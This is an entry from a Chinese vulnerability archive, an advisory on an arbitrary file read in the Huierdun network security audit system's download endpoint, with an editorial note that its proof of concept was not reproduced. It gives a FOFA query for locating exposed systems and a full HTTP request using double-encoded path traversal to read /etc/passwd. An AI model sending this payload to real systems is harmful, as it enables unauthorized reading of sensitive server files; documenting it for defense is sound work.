---
source: "wy876 漏洞文库"
id: "vw-d283b24ffa7cb773f96f174e"
entity_id: "ve-d283b24ffa7cb773f96f174e"
schema_version: "1"
title: "惠尔顿安全审计系统download任意文件读取漏洞"
product: "惠尔顿网络安全审计"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求无cookie，具体版本/auth未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%83%A0%E5%B0%94%E9%A1%BF/%E6%83%A0%E5%B0%94%E9%A1%BF%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hbrwp07p75ysgyvt"
source_status: "recorded"
---

# 惠尔顿安全审计系统download任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：惠尔顿网络安全审计
- 本文讨论：download双重编码路径穿越
- 版本、权限与配置前提：请求无cookie，具体版本/auth未知
- 资料类型：路径穿越读取摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅请求无响应，双重解码链未解释；无固定固件或原披露
- 大段产品介绍不补证据
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 双重解码是否依赖代理及鉴权边界待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
对于军民融合政策的诸多中小企业来讲，大部分人员主要时间都时在非涉密区工作，并需要用到网络， 所以上网时不小心泄密成了一个可能泄密的高概率事件。 惠尔顿 通过 三员化管理、实名认证上网、网页记录、 邮件审查、文件上传下载、即时通讯、防私接、统计报表 等八大方面确保上网不泄密。惠尔顿网络安全审计系统download接口处存在任意文件读取漏洞，恶意攻击者可能会利用此漏洞获取服务器敏感信息，从而造成信息泄露。

# 二、影响版本
+ 惠尔顿安全审计系统

# 三、资产测绘
+ fofa`app="惠尔顿-网络安全审计系统"`
+ 特征


# 四、漏洞复现
```http
GET /download/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hbrwp07p75ysgyvt>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
